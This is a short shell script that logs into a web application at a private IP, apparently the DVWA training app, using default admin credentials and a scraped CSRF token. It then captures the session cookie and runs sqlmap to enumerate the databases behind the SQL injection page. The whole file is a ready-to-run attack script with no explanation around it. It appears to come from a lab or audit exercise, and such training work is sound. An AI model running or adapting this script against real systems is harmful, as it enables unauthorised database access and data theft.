#!/bin/sh
T="http://10.40.0.10"
CJ=/tmp/cj_audit
rm -f "$CJ"
TOKEN=$(curl -s -c "$CJ" "$T/login.php" | grep -o "user_token. value=.[0-9a-f]\{32\}" | grep -o "[0-9a-f]\{32\}")
curl -s -b "$CJ" -c "$CJ" -o /dev/null --data "username=admin&password=password&Login=Login&user_token=$TOKEN" "$T/login.php"
SID=$(grep PHPSESSID "$CJ" | awk '{print $7}')
echo "session PHPSESSID=$SID"
sqlmap -u "$T/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=$SID" -p id --dbms=mysql --batch --dbs --output-dir=/data/preuves
